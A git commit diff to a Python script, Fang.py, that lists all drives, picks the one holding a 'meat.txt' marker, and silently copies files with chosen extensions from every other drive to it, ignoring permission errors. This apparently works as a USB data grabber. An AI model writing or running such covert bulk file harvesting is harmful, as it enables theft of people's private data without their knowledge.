22286a74ce5889876b753ec62279c4ac1c9a6945
C4piti44 <97689075+C4piti44@users.noreply.github.com>
2022-02-02 22:28:14 +0200

    Update Fang.py
    wow

--- Fang.py
+++ Fang.py
@@ -4,21 +4,37 @@ import os
 from itertools import chain
 from string import ascii_uppercase
 
-#this function returns all of the drivers the computer has.
+
+# this function returns all of the drivers the computer has.
 def get_drivers():
-    list=[]
+    list = []
     for letter in ascii_uppercase:
-        if (os.path.exists(letter+r':\\')):
-            list.append(letter+r':\\')
+        if (os.path.exists(letter + r':\\')):
+            list.append(letter + r':\\')
     return list
 
 
+# this function returns the place that Fang should copy the files to
+def check(list):
+    global the_place
+    for driver in list:
+        if os.path.exists(driver + 'meat.txt'):
+            the_place = driver
+    return the_place
+
+
+the_place = ""
+# the drivers i need to go thorough
 drivers = get_drivers()
+# the place that all the copied files go to
+des = check(drivers)
+drivers.remove(des)
+
 for dirpath, dirname, filenames in chain.from_iterable(os.walk(driver) for driver in drivers):
     for file in filenames:
         if any(file.endswith(extension) for extension in ex_list):
             try:
-                shutil.copy(os.path.join(dirpath, file), os.abspath)
+                shutil.copy(os.path.join(dirpath, file), des)
             except PermissionError:
                 pass
             except FileNotFoundError:
